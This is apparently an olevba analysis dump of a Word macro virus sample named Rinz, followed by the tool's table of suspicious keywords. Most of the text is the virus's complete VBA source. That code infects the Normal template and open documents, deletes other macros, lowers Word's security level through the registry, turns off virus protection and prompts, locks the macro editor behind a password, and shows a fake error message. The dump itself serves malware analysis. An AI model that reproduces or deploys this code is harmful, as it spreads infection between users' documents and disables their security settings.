olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rinz-feb110ac2d91d4a53d719a6aba208997be9e8325
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rinz-feb110ac2d91d4a53d719a6aba208997be9e8325 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO rianz.bas 
in file: Virus.MSWord.Rinz-feb110ac2d91d4a53d719a6aba208997be9e8325 - OLE stream: 'Macros/VBA/rianz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub InfekAD()
    Dim DOk As Boolean
    DOk = False
    On Error Resume Next
    
    For Each obj In ActiveDocument.VBProject.VBComponents
        If obj.Name = "rianz" Then DOk = True
        If obj.Name <> "rianz" And obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=obj.Name, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next obj
    
    If DOk = False Then
        ActiveDocument.VBProject.VBComponents.Import ("C:\windows\Word.dat")
        ActiveDocument.Save
    End If
    
End Sub

Sub InfekNT()
    Dim NTOk As Boolean
    NTOk = False
    On Error Resume Next
    
    For Each obj In NormalTemplate.VBProject.VBComponents
        If obj.Name = "rianz" Then NTOk = True
        If obj.Name <> "rianz" And obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=obj.Name, _
            Object:=wdOrganizerObjectProjectItems
        End If
    Next obj
    
    If NTOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="rianz", _
        Object:=wdOrganizerObjectProjectItems
    End If
    
    NormalTemplate.VBProject.VBComponents.Item("rianz").Export ("C:\Windows\Word.dat")
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        CommandBars("Tools").Controls("Macros").Enabled = False
        Options.ConfirmConversions = (1 - 1)
        NoActive
    End If
    
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        InfekNT
    End If
    
    Action
    NoActive
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        CommandBars("Tools").Controls("Macros").Enabled = False
        Options.ConfirmConversions = (1 - 1)
        NoActive
    End If
    InfekNT
    NoActive
    Action
End Sub

Private Sub FileSave()
    On Error Resume Next
    InfekAD
    ActiveDocument.Save
    ActiveDocument.Saved = True
End Sub

Sub AutoClose()

    On Error Resume Next
    
    InfekNT
    InfekAD
    If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 5), 5) <> "Sub I" Then
        ActiveDocument.Saved = True
    End If
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Microsoft Word") = "C2K2X" Then
        Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub NoActive()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
    Application.EnableCancelKey = wdCancelDisabled
End Sub

Sub ViewVBCode()
    If InputBox("Enter password", "Microsoft Word") = "C2K2X" Then
        Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    NoActive
End Sub

Sub ToolsMacro()
    MsgBox "A required DLL file is missing ...", vbExclamation + vbOKOnly
End Sub

Sub Action()
    If Day(Now) = Minute(Now) Then
    With ActiveDocument
        .ActiveWindow.Caption = "Rianz Yang Cantik ..."
    End With
    End If
End Sub

Sub Pesan()
    Logo = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" & Chr(13) & Chr(10) & _
           "XX           XXX   XXX      XXX    XXX    XXXXXXXXXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX     XXX    XX                XX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX         X    XXXXXX     XXX" & Chr(13) & Chr(10) & _
           "XX           XXX   XX          XX    X          XXXX      XXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX   XXX      XXX    XXXXXX" & Chr(13) & Chr(10) & _
           "XX   XXX   XX   XX   XX   XX   XXXX    XX               XX" & Chr(13) & Chr(10) & _
           "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  = by Ded's ="
    If Day(Now) = Minute(Now) Then
        P = MsgBox(Logo, vbOKOnly, "From Bandung With Love")
    End If
End Sub

Sub AutoExit()
    Pesan
    Application.Quit
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

